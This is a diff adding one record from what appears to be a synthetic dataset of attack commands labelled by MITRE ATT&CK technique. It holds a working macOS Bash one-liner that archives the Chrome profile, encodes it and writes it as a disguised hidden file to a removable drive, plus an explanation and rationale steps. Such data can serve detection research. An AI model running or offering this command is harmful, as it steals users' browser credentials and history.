@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Library/Application Support/Google/Chrome/Default\" | base64 | dd of=\"/Volumes/UNTITLED/.cache/.gupd\" bs=4m conv=sync,noerror && sync",
+  "explanation": "Packages the Chrome profile directory, base64-encodes it, and writes to a cache-looking file on a removable drive via dd to stage browsing data offline.",
+  "rationale_steps": [
+    "Target application data likely to contain credentials and history.",
+    "Encode the data to mimic cache-like text content.",
+    "Write to external media with dd, remaining entirely local.",
+    "Sync to ensure completion before removal."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-c4fc4f2b",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
